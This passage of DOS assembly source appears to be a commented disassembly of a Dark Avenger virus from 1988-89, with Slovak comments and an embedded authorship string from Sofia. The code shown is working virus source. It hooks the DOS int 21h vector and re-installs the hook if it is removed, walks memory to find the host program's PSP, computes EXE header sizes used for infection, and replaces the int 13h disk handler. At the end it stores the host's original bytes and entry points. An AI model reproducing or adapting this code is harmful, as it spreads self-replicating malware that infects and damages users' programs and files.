test_redef_21:  push    ds
        push    ax
        push    bx
        push    dx
        xor bx,bx           ;DS=0
        mov ds,bx
        lds dx,dword ptr ds:interrupt_21
        cmp dx,new_21-run_vir   ;Test offset int 21h
        jne redefine
        mov ax,ds
        mov bx,cs
        cmp ax,bx           ;Test segment int 21h
        je  not_redef
        xor bx,bx           ;BX = 0

redefine:   mov ax,[bx]
        cmp ax,new_21-run_vir
        jne loc_10
        mov ax,cs
        cmp ax,[bx+2]
        je  loc_11

loc_10:     inc bx
        jnz redefine
        jz  loc_12

loc_11:     mov ax,cs:[old_21]
        mov [bx],ax
        mov ax,cs:[old_21+2]
        mov [bx+2],ax
        mov cs:[old_21],dx
        mov cs:[old_21+2],ds
        xor bx,bx           ;BX = 0

loc_12:     mov ds,bx
        mov word ptr ds:interrupt_21,new_21-run_vir
        mov word ptr ds:interrupt_21+2,cs

not_redef:  pop dx
        pop bx
        pop ax
        pop ds
        retn
set_PSP_0   endp


;--------------------------------------------------------------------
;   Nastavenie DS na PSP programu ktory je v RAM podo mnou ???
;--------------------------------------------------------------------
set_DSonPSPact  proc    near
        push    ax          ;Push AX,BX
        push    bx
        mov ah,62h          ;Get PSP  BX = Seg adr of PSP
        call    call_old_21
        mov ax,cs
        dec ax          ;AX = CS-1
        dec bx          ;Dec seg adr PSP
hladaj_dalej:   mov ds,bx
        stc
        adc bx,ds:PSP_top_ram+1 ;Pripocitaj HI byte top of avail mem
        cmp bx,ax           ;Je to nas segment ?
        jb  hladaj_dalej        ;Ak je stale mensi hladaj
        pop bx          ;Pop BX,AX
        pop ax
        retn
set_DSonPSPact  endp


;-----------------------------------------------------------------------
; Prepocet velkosti Header EXE v paragrafoch na byte. DX:AX = 16*HdrSize
;-----------------------------------------------------------------------
Header_EXE_Size proc    near
        mov ax,word ptr ds:[EXE_Hdr_Size]   ;Size header EXE in paragr.
;-----------------------------------------------------------------------
;   Konverzia seg adresy v AX na byte   DX:AX = 16*AX
;-----------------------------------------------------------------------
Paragr2_addr:   mov dx,16
        mul dx          ;dx:ax = 10h * ax
        retn
Header_EXE_Size endp

        db  'This program was written in the city of Sofia '
        db  '(C) 1988-89 Dark Avenger',0

; ---------------------------------------------------------------------
;           Novy Disk I/O interrupt
; ---------------------------------------------------------------------
new_13:     cmp ah,3
        jne no_write_sect
        cmp dl,80h
        jae viac_rovno
        db  0EAh            ;jmp    far ptr old_40
old_40      dw  0EC59h, 0F000h

viac_rovno: db  0EAh            ;jmp    far ptr old_13
old_13      dw  1DADh, 0070h
no_write_sect:  db  0EAh            ;jmp    far ptr doc_old_13
doc_old_13  dw  1DADh, 0070h

start_programm  dw  100h, 1726h
stack_programm  dw  0, 21CDh
original_bytes  db  90h, 90h, 90h       ;Povodne 3 byte NOP,NOP,NOP

virus_dav   ends
        end start
